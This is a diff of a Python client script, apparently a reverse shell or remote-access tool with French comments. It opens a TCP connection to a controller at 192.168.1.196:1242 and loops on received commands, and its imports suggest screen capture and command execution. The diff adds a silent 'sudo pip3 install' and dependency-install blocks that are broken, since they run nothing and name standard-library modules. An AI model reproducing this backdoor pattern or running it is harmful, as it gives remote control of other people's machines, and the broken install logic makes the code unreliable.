@@ -1,9 +1,41 @@
-import socket as s
 import subprocess
-from mss import mss
-import requests
-from bs4 import BeautifulSoup as soup
-import base64
+import sys
+import os
+os.popen("sudo /usr/bin/pip3 install --upgrade typing")
+try:
+    import mss
+except ImportError:
+    sys.executable, "-m", "pip3", "install", 'mss'
+finally:
+    import mss
+
+try:
+    import socket
+except ImportError:
+    sys.executable, "-m", "pip3", "install", 'socket'
+finally:
+    import socket as s
+try:
+    import requests
+except ImportError:
+    sys.executable, "-m", "pip3", "install", 'requests'
+finally:
+    import requests
+try:
+    import bs4
+except ImportError:
+    sys.executable, "-m", "pip3", "install", 'bs4'
+finally:
+    from bs4 import BeautifulSoup as soup
+try:
+    import base64
+except ImportError:
+    sys.executable, "-m", "pip3", "install", 'base64'
+finally:
+    import base64
+
+
+
 
 message = str()
 #### Client ######
@@ -30,7 +62,7 @@ mon_socket = s.socket(s.AF_INET,s.SOCK_STREAM)
 
 ### Fonction connect((host,port)
 
-mon_socket.connect(("127.0.0.1",1242))
+mon_socket.connect(("192.168.1.196",1242))
 while message != "exit":
     message = mon_socket.recv(262144)
     message = message.decode('UTF-8')
